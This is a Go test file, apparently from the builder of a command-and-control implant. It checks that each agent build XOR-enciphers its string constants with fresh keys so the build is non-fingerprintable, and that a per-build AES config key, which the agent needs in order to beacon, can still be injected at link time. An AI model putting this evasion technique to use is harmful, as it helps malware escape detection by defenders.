package payload

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// strxorConstants extracts name -> plaintext from a strxor.go body using the
// same XOR decode the agent runtime performs.
func strxorConstants(t *testing.T, data []byte) map[string]string {
	t.Helper()
	m := map[string]string{}
	for _, match := range strxorConstRegex.FindAllStringSubmatch(string(data), -1) {
		plain, err := decodeSConst(match[2])
		if err != nil {
			t.Fatalf("decode %s: %v", match[1], err)
		}
		m[match[1]] = plain
	}
	return m
}

// TestRandomizeStrxorRoundTrip verifies the generated table decrypts back to
// the same plaintext as the embedded template and that fresh draws differ, so
// every agent build produces a unique, non-fingerprintable table.
func TestRandomizeStrxorRoundTrip(t *testing.T) {
	template, err := payloadFS.ReadFile("agent/strxor.go")
	if err != nil {
		t.Fatalf("read template: %v", err)
	}

	genA, err := randomizeStrxor()
	if err != nil {
		t.Fatalf("randomizeStrxor: %v", err)
	}
	genB, err := randomizeStrxor()
	if err != nil {
		t.Fatalf("randomizeStrxor: %v", err)
	}
	if bytes.Equal(genA, genB) {
		t.Fatal("two randomizations produced identical tables")
	}

	tmpl := strxorConstants(t, template)
	ca := strxorConstants(t, genA)
	cb := strxorConstants(t, genB)
	if len(ca) != len(tmpl) || len(cb) != len(tmpl) {
		t.Fatalf("constant count mismatch: template=%d genA=%d genB=%d", len(tmpl), len(ca), len(cb))
	}

	// Both generated tables must decode to identical plaintext as the template
	// (same meaning), while shipping different cipher bytes (fresh keys).
	for name, plain := range tmpl {
		if ca[name] != plain {
			t.Fatalf("genA const %s decode mismatch: %q != %q", name, ca[name], plain)
		}
		if cb[name] != plain {
			t.Fatalf("genB const %s decode mismatch: %q != %q", name, cb[name], plain)
		}
	}

	// No plaintext may leak into the delivered const block (the header imports
	// legitimately contain words like "encoding", so limit the scan to it).
	// Very short plaintexts ("os", "ip", ...) are skipped: they are unavoidable
	// as substrings of hex/base64 alphabet values; anything ≥5 bytes that
	// survives verbatim is a genuine leak.
	caBlock := constBlock(t, genA)
	for _, plain := range tmpl {
		if len(plain) >= 5 && bytes.Contains(caBlock, []byte(plain)) {
			t.Fatalf("generated strxor.go const block leaks plaintext %q", plain)
		}
	}
}

func constBlock(t *testing.T, data []byte) []byte {
	t.Helper()
	text := string(data)
	start := indexOf(text, "const (")
	end := indexOf(text, "\n\n//go:noinline")
	if start < 0 || end < start {
		t.Fatal("const block not found in generated file")
	}
	return []byte(text[start:end])
}

// TestRandomizeStrxorUniqueness asserts fresh draws encipher at least one
// constant differently (they are byte-identical in structure otherwise).
func TestRandomizeStrxorUniqueness(t *testing.T) {
	genA, err := randomizeStrxor()
	if err != nil {
		t.Fatalf("randomizeStrxor: %v", err)
	}
	genB, err := randomizeStrxor()
	if err != nil {
		t.Fatalf("randomizeStrxor: %v", err)
	}
	if bytes.Equal(genA, genB) {
		t.Fatal("randomization is deterministic")
	}
}

func TestInjectRandomizedStrxor(t *testing.T) {
	dir := t.TempDir()
	if err := injectRandomizedStrxor(dir); err != nil {
		t.Fatalf("injectRandomizedStrxor: %v", err)
	}
	out, err := os.ReadFile(filepath.Join(dir, "strxor.go"))
	if err != nil {
		t.Fatalf("read generated strxor.go: %v", err)
	}
	consts := strxorConstants(t, out)
	if len(consts) == 0 {
		t.Fatal("no constants extracted from injected strxor.go")
	}
}

// TestRandomizeStrxorPreservesSConfigKeyVar guards against a regression where
// SConfigKey (the per-build config-blob AES key, delivered via -ldflags -X
// main.SConfigKey) was rewritten into the const block by randomizeStrxor,
// turning it into a const the linker cannot override. If that happens the
// injected key is silently dropped and the agent fails to decrypt the config
// blob (it never beacons). SConfigKey must survive as a var.
func TestRandomizeStrxorPreservesSConfigKeyVar(t *testing.T) {
	gen, err := randomizeStrxor()
	if err != nil {
		t.Fatalf("randomizeStrxor: %v", err)
	}
	text := string(gen)
	if strings.Contains(text, "const SConfigKey") {
		t.Fatal("randomizeStrxor re-emitted SConfigKey as a const; -X main.SConfigKey override would be ignored")
	}
	if !strings.Contains(text, "var SConfigKey") {
		t.Fatal("randomizeStrxor dropped SConfigKey; the per-build key cannot be injected")
	}
}
